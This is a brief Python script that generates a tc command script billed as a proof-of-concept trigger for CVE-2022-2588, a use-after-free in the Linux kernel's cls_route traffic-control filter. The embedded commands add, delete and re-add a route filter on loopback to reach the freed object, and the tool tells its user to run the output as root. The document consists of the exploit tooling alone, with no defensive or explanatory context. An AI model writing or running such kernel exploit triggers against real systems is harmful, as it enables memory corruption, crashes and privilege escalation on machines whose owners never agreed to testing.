#!/usr/bin/env python3
"""CVE-2022-2588 — Linux cls_route use-after-free. Zero-click-ish via crafted
tc filter; reachable from a netns. Public PoC. HIGH."""
import sys
from pathlib import Path

TC_SCRIPT = r'''
# cls_route UAF trigger — add then delete a route filter with a dangling handle
tc qdisc add dev lo root handle 1: htb
tc filter add dev lo parent 1: handle 0x1 protocol ip prio 1 route to 127.0.0.1
tc filter del dev lo parent 1: handle 0x1 protocol ip prio 1 route
tc filter add dev lo parent 1: handle 0x2 protocol ip prio 1 route to 127.0.0.1
tc qdisc del dev lo root
'''

def build() -> bytes:
    return TC_SCRIPT.encode()

def main():
    out = Path(sys.argv[1] if len(sys.argv) > 1 else "cve-2022-2588.sh")
    out.write_bytes(build())
    print(f"[+] CVE-2022-2588 tc script -> {out}  (run as root)")

if __name__ == "__main__":
    main()
